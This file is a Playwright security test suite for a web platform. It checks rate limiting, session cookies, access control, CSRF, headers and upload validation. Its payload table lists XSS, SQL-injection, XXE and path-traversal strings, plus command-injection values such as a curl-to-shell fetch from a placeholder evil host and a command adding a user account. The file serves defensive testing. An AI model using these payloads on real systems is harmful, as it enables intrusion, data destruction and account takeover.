/**
 * Bulletproof Security Test Suite for AllIN Platform
 * Zero tolerance for security vulnerabilities
 */

import { test, expect, Page } from '@playwright/test';
import AxeBuilder from '@axe-core/playwright';
import crypto from 'crypto';

// Test data for security testing
const SECURITY_TEST_ACCOUNTS = {
  admin: { email: 'admin@allin.demo', password: 'Admin123!@#' },
  attacker: { email: 'attacker@evil.com', password: 'Hack123!@#' },
  victim: { email: 'victim@allin.demo', password: 'Victim123!@#' }
};

// Common attack payloads
const ATTACK_PAYLOADS = {
  xss: [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '<svg onload=alert("XSS")>',
    '${alert("XSS")}',
    '{{constructor.constructor("alert(1)")()}}',
    '<iframe src="javascript:alert(`XSS`)"></iframe>'
  ],
  sqlInjection: [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1' UNION SELECT * FROM users--",
    "admin' --",
    "' OR 1=1--",
    "1; DELETE FROM users WHERE 1=1--"
  ],
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....//....//....//etc/passwd'
  ],
  commandInjection: [
    '; ls -la',
    '| whoami',
    '`cat /etc/passwd`',
    '$(curl evil.com/shell.sh | sh)',
    '& net user hacker P@ssw0rd /add &'
  ],
  ldapInjection: [
    '*)(uid=*',
    '*)(|(uid=*))',
    '*()|&',
    '*)(uid=*))(|(uid=*'
  ],
  xxe: [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>'
  ],
  csrf: [
    '<form action="/api/admin/delete-user" method="POST"><input name="userId" value="1"></form>',
    '<img src="/api/logout" style="display:none">'
  ]
};

test.describe('🔒 Security Test Suite - Critical Paths', () => {
  test.beforeEach(async ({ page }) => {
    // Set up security headers monitoring
    page.on('response', response => {
      const headers = response.headers();

      // Check for security headers
      const requiredHeaders = [
        'x-frame-options',
        'x-content-type-options',
        'x-xss-protection',
        'strict-transport-security',
        'content-security-policy'
      ];

      for (const header of requiredHeaders) {
        if (!headers[header]) {
          console.warn(`Missing security header: ${header} on ${response.url()}`);
        }
      }
    });
  });

  test.describe('Authentication Security', () => {
    test('should prevent brute force attacks with rate limiting', async ({ page }) => {
      await page.goto('/auth/login');

      // Attempt multiple failed logins
      const attempts = 10;
      let blockedAt = -1;

      for (let i = 0; i < attempts; i++) {
        await page.fill('input[name="email"]', 'admin@allin.demo');
        await page.fill('input[name="password"]', `wrong${i}`);
        await page.click('button[type="submit"]');

        // Check if rate limited
        const errorMessage = await page.textContent('.error-message').catch(() => '');
        if (errorMessage.includes('Too many attempts') || errorMessage.includes('rate limit')) {
          blockedAt = i + 1;
          break;
        }

        await page.waitForTimeout(100);
      }

      // Should be rate limited before 10 attempts
      expect(blockedAt).toBeGreaterThan(0);
      expect(blockedAt).toBeLessThanOrEqual(5);
    });

    test('should prevent timing attacks on login', async ({ page }) => {
      await page.goto('/auth/login');

      const timings: number[] = [];

      // Test with valid email
      for (let i = 0; i < 5; i++) {
        const start = Date.now();
        await page.fill('input[name="email"]', 'admin@allin.demo');
        await page.fill('input[name="password"]', 'wrongpassword');
        await page.click('button[type="submit"]');
        await page.waitForSelector('.error-message');
        timings.push(Date.now() - start);
      }

      // Test with invalid email
      for (let i = 0; i < 5; i++) {
        const start = Date.now();
        await page.fill('input[name="email"]', 'nonexistent@allin.demo');
        await page.fill('input[name="password"]', 'wrongpassword');
        await page.click('button[type="submit"]');
        await page.waitForSelector('.error-message');
        timings.push(Date.now() - start);
      }

      // Calculate variance - should be minimal to prevent timing attacks
      const avgTiming = timings.reduce((a, b) => a + b) / timings.length;
      const variance = timings.reduce((sum, t) => sum + Math.pow(t - avgTiming, 2), 0) / timings.length;
      const stdDev = Math.sqrt(variance);

      // Standard deviation should be less than 10% of average
      expect(stdDev / avgTiming).toBeLessThan(0.1);
    });

    test('should enforce strong password requirements', async ({ page }) => {
      await page.goto('/auth/register');

      const weakPasswords = [
        'password',
        '12345678',
        'qwerty123',
        'Password',
        'Pass123'
      ];

      for (const password of weakPasswords) {
        await page.fill('input[name="password"]', password);
        await page.click('button[type="submit"]');

        const error = await page.textContent('.password-error').catch(() => '');
        expect(error).toContain('password');
      }
    });

    test('should prevent session hijacking', async ({ page, context }) => {
      // Login as legitimate user
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      // Get cookies
      const cookies = await context.cookies();
      const sessionCookie = cookies.find(c => c.name === 'session' || c.name === 'token');

      // Session cookie should have security flags
      expect(sessionCookie?.httpOnly).toBe(true);
      expect(sessionCookie?.secure).toBe(true);
      expect(sessionCookie?.sameSite).toBe('Strict');
    });

    test('should invalidate sessions on logout', async ({ page }) => {
      // Login
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      // Logout
      await page.click('button[data-testid="logout"]');
      await page.waitForURL('/auth/login');

      // Try to access protected route
      await page.goto('/dashboard');
      await expect(page).toHaveURL('/auth/login');
    });
  });

  test.describe('Input Validation & Sanitization', () => {
    test('should prevent XSS attacks in all input fields', async ({ page }) => {
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      // Navigate to content creation
      await page.goto('/dashboard/content/new');

      // Test all input fields with XSS payloads
      for (const payload of ATTACK_PAYLOADS.xss) {
        await page.fill('input[name="title"]', payload);
        await page.fill('textarea[name="content"]', payload);
        await page.click('button[data-testid="save-draft"]');

        // Check that script was not executed
        const alertPresent = await page.evaluate(() => {
          return new Promise(resolve => {
            const originalAlert = window.alert;
            window.alert = () => {
              window.alert = originalAlert;
              resolve(true);
            };
            setTimeout(() => resolve(false), 100);
          });
        });

        expect(alertPresent).toBe(false);

        // Check that payload was properly escaped in display
        const titleDisplay = await page.textContent('[data-testid="title-display"]').catch(() => '');
        expect(titleDisplay).not.toContain('<script>');
        expect(titleDisplay).not.toContain('javascript:');
      }
    });

    test('should prevent SQL injection in search and filters', async ({ page }) => {
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      await page.goto('/dashboard/content');

      for (const payload of ATTACK_PAYLOADS.sqlInjection) {
        await page.fill('input[name="search"]', payload);
        await page.click('button[data-testid="search-button"]');

        // Should not show database error
        const errorVisible = await page.isVisible('.database-error').catch(() => false);
        expect(errorVisible).toBe(false);

        // Should show normal "no results" message
        const noResults = await page.isVisible('[data-testid="no-results"]').catch(() => false);
        expect(noResults).toBe(true);
      }
    });

    test('should prevent path traversal in file uploads', async ({ page }) => {
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      await page.goto('/dashboard/media');

      // Create malicious filename
      const maliciousFilenames = [
        '../../../etc/passwd.jpg',
        '..\\..\\..\\windows\\system32\\config\\sam.jpg',
        'normal.jpg/../../../evil.php'
      ];

      for (const filename of maliciousFilenames) {
        // Attempt to upload with malicious filename
        const fileContent = Buffer.from('test content');
        await page.setInputFiles('input[type="file"]', {
          name: filename,
          mimeType: 'image/jpeg',
          buffer: fileContent
        });

        // Check that file was sanitized or rejected
        const uploadedName = await page.textContent('[data-testid="uploaded-filename"]').catch(() => '');
        expect(uploadedName).not.toContain('..');
        expect(uploadedName).not.toContain('/etc/');
        expect(uploadedName).not.toContain('\\windows\\');
      }
    });

    test('should validate and sanitize JSON payloads', async ({ page }) => {
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      // Intercept API calls to inject malicious JSON
      await page.route('/api/**', async route => {
        if (route.request().method() === 'POST') {
          const maliciousPayloads = [
            { __proto__: { isAdmin: true } },
            { constructor: { prototype: { isAdmin: true } } },
            { 'user": {"isAdmin": true}, "dummy': 'value' }
          ];

          for (const payload of maliciousPayloads) {
            await route.fulfill({
              status: 400,
              body: JSON.stringify({ error: 'Invalid payload' })
            });
          }
        } else {
          await route.continue();
        }
      });
    });
  });

  test.describe('Authorization & Access Control', () => {
    test('should prevent privilege escalation', async ({ page }) => {
      // Login as regular user
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', 'creator@allin.demo');
      await page.fill('input[name="password"]', 'Creator123!@#');
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      // Try to access admin routes
      const adminRoutes = [
        '/dashboard/admin',
        '/dashboard/admin/users',
        '/dashboard/admin/settings',
        '/dashboard/admin/billing'
      ];

      for (const route of adminRoutes) {
        await page.goto(route);
        // Should redirect to unauthorized or dashboard
        const url = page.url();
        expect(url).not.toContain('/admin');
      }
    });

    test('should prevent IDOR (Insecure Direct Object Reference)', async ({ page }) => {
      // Login as user
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', 'creator@allin.demo');
      await page.fill('input[name="password"]', 'Creator123!@#');
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      // Try to access other user's resources
      await page.goto('/dashboard/content/edit/999999'); // Another user's content

      // Should show error or redirect
      const errorVisible = await page.isVisible('[data-testid="unauthorized-error"]').catch(() => false);
      const redirected = !page.url().includes('/edit/999999');

      expect(errorVisible || redirected).toBe(true);
    });

    test('should validate API authorization', async ({ page }) => {
      // Login as regular user
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', 'creator@allin.demo');
      await page.fill('input[name="password"]', 'Creator123!@#');
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      // Try to make admin API calls
      const response = await page.evaluate(async () => {
        const adminEndpoints = [
          { url: '/api/admin/users', method: 'GET' },
          { url: '/api/admin/user/1', method: 'DELETE' },
          { url: '/api/admin/settings', method: 'PUT', body: { setting: 'value' } }
        ];

        const results = [];
        for (const endpoint of adminEndpoints) {
          const res = await fetch(endpoint.url, {
            method: endpoint.method,
            headers: { 'Content-Type': 'application/json' },
            body: endpoint.body ? JSON.stringify(endpoint.body) : undefined
          });
          results.push(res.status);
        }
        return results;
      });

      // All admin endpoints should return 403 Forbidden
      for (const status of response) {
        expect(status).toBe(403);
      }
    });
  });

  test.describe('CSRF Protection', () => {
    test('should include CSRF tokens in forms', async ({ page }) => {
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      await page.goto('/dashboard/settings');

      // Check for CSRF token
      const csrfToken = await page.getAttribute('input[name="csrf_token"]', 'value').catch(() =>
        page.getAttribute('meta[name="csrf-token"]', 'content')
      );

      expect(csrfToken).toBeTruthy();
      expect(csrfToken?.length).toBeGreaterThan(20);
    });

    test('should reject requests without valid CSRF token', async ({ page }) => {
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      // Make request without CSRF token
      const response = await page.evaluate(async () => {
        const res = await fetch('/api/settings', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ theme: 'dark' })
        });
        return { status: res.status, text: await res.text() };
      });

      expect(response.status).toBe(403);
      expect(response.text).toContain('csrf');
    });
  });

  test.describe('Security Headers', () => {
    test('should have all required security headers', async ({ page }) => {
      const response = await page.goto('/');
      const headers = response?.headers() || {};

      // Check X-Frame-Options
      expect(headers['x-frame-options']).toMatch(/DENY|SAMEORIGIN/i);

      // Check X-Content-Type-Options
      expect(headers['x-content-type-options']).toBe('nosniff');

      // Check Strict-Transport-Security
      expect(headers['strict-transport-security']).toContain('max-age=');

      // Check Content-Security-Policy
      expect(headers['content-security-policy']).toBeTruthy();

      // Check X-XSS-Protection (legacy but still good to have)
      expect(headers['x-xss-protection']).toMatch(/1.*mode=block/);
    });

    test('should implement proper CSP directives', async ({ page }) => {
      const response = await page.goto('/');
      const csp = response?.headers()['content-security-policy'] || '';

      // Check for important CSP directives
      expect(csp).toContain("default-src");
      expect(csp).toContain("script-src");
      expect(csp).toContain("style-src");
      expect(csp).not.toContain("'unsafe-inline'");
      expect(csp).not.toContain("'unsafe-eval'");
    });
  });

  test.describe('File Upload Security', () => {
    test('should validate file types', async ({ page }) => {
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      await page.goto('/dashboard/media');

      // Try to upload executable files
      const dangerousFiles = [
        { name: 'malware.exe', type: 'application/x-msdownload' },
        { name: 'script.js', type: 'application/javascript' },
        { name: 'backdoor.php', type: 'application/x-php' },
        { name: 'evil.svg', type: 'image/svg+xml', content: '<svg onload="alert(1)"></svg>' }
      ];

      for (const file of dangerousFiles) {
        const fileContent = Buffer.from(file.content || 'malicious content');

        await page.setInputFiles('input[type="file"]', {
          name: file.name,
          mimeType: file.type,
          buffer: fileContent
        });

        // Should show error
        const error = await page.textContent('[data-testid="upload-error"]').catch(() => '');
        expect(error).toContain('not allowed');
      }
    });

    test('should enforce file size limits', async ({ page }) => {
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      await page.goto('/dashboard/media');

      // Create large file (100MB)
      const largeFile = Buffer.alloc(100 * 1024 * 1024);

      await page.setInputFiles('input[type="file"]', {
        name: 'large.jpg',
        mimeType: 'image/jpeg',
        buffer: largeFile
      });

      // Should show size error
      const error = await page.textContent('[data-testid="upload-error"]').catch(() => '');
      expect(error).toContain('size');
    });
  });

  test.describe('API Security', () => {
    test('should implement rate limiting on API endpoints', async ({ page }) => {
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      // Make rapid API calls
      const results = await page.evaluate(async () => {
        const responses = [];
        for (let i = 0; i < 100; i++) {
          const res = await fetch('/api/content');
          responses.push(res.status);
          if (res.status === 429) break;
        }
        return responses;
      });

      // Should hit rate limit
      expect(results).toContain(429);
    });

    test('should validate API input schemas', async ({ page }) => {
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      // Send malformed requests
      const response = await page.evaluate(async () => {
        const malformedRequests = [
          { email: 123 }, // Wrong type
          { email: 'not-an-email' }, // Invalid format
          { password: ['array'] }, // Wrong type
          { extra: 'field', unexpected: 'property' } // Extra fields
        ];

        const results = [];
        for (const payload of malformedRequests) {
          const res = await fetch('/api/user/update', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          results.push({ status: res.status, body: await res.json() });
        }
        return results;
      });

      // All should return validation errors
      for (const res of response) {
        expect(res.status).toBe(400);
        expect(res.body.error).toContain('validation');
      }
    });
  });

  test.describe('Cryptography & Secrets', () => {
    test('should not expose sensitive data in responses', async ({ page }) => {
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      // Get user profile
      const profileData = await page.evaluate(async () => {
        const res = await fetch('/api/user/profile');
        return await res.json();
      });

      // Should not contain sensitive fields
      expect(profileData).not.toHaveProperty('password');
      expect(profileData).not.toHaveProperty('passwordHash');
      expect(profileData).not.toHaveProperty('salt');
      expect(profileData).not.toHaveProperty('secretKey');
      expect(profileData).not.toHaveProperty('apiKey');
    });

    test('should encrypt sensitive data at rest', async ({ page }) => {
      // This test would need backend access to verify encryption
      // For now, we check that sensitive data is not visible in localStorage/sessionStorage

      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      const storageData = await page.evaluate(() => {
        const local = { ...localStorage };
        const session = { ...sessionStorage };
        return { local, session };
      });

      // Check that no passwords or sensitive tokens are in plain text
      const sensitivePatterns = [
        /password/i,
        /secret/i,
        /private/i,
        /apikey/i,
        /token.*[A-Za-z0-9]{40,}/
      ];

      for (const [key, value] of Object.entries(storageData.local)) {
        for (const pattern of sensitivePatterns) {
          if (pattern.test(key)) {
            // If key suggests sensitive data, value should be encrypted/hashed
            expect(value).not.toContain('Admin123');
            expect(value).not.toContain(SECURITY_TEST_ACCOUNTS.admin.password);
          }
        }
      }
    });
  });

  test.describe('Accessibility Security', () => {
    test('should pass accessibility checks', async ({ page }) => {
      await page.goto('/');

      const accessibilityResults = await new AxeBuilder({ page })
        .withTags(['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa'])
        .analyze();

      expect(accessibilityResults.violations).toHaveLength(0);
    });

    test('should not expose sensitive info to screen readers', async ({ page }) => {
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      // Check that sensitive elements have proper ARIA attributes
      const sensitiveElements = await page.$$eval('[data-sensitive="true"]', elements =>
        elements.map(el => ({
          ariaHidden: el.getAttribute('aria-hidden'),
          ariaLabel: el.getAttribute('aria-label')
        }))
      );

      for (const element of sensitiveElements) {
        // Sensitive elements should either be hidden or have safe labels
        if (!element.ariaHidden) {
          expect(element.ariaLabel).not.toContain('password');
          expect(element.ariaLabel).not.toContain('token');
          expect(element.ariaLabel).not.toContain('secret');
        }
      }
    });
  });

  test.describe('Performance & DoS Protection', () => {
    test('should handle large payloads gracefully', async ({ page }) => {
      await page.goto('/auth/login');
      await page.fill('input[name="email"]', SECURITY_TEST_ACCOUNTS.admin.email);
      await page.fill('input[name="password"]', SECURITY_TEST_ACCOUNTS.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForURL('/dashboard');

      // Generate large payload (10MB of text)
      const largePayload = 'x'.repeat(10 * 1024 * 1024);

      const response = await page.evaluate(async (payload) => {
        const res = await fetch('/api/content', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: payload })
        });
        return { status: res.status };
      }, largePayload);

      // Should reject large payloads
      expect(response.status).toBe(413); // Payload Too Large
    });

    test('should prevent ReDoS attacks', async ({ page }) => {
      await page.goto('/auth/login');

      // Evil regex patterns that can cause ReDoS
      const evilPatterns = [
        'x'.repeat(100) + 'y',
        '(a+)+b',
        '(a*)*b',
        '(a|a)*b'
      ];

      for (const pattern of evilPatterns) {
        const start = Date.now();
        await page.fill('input[name="email"]', pattern + '@evil.com');
        await page.click('button[type="submit"]');
        const elapsed = Date.now() - start;

        // Should timeout quickly, not hang
        expect(elapsed).toBeLessThan(1000);
      }
    });
  });
});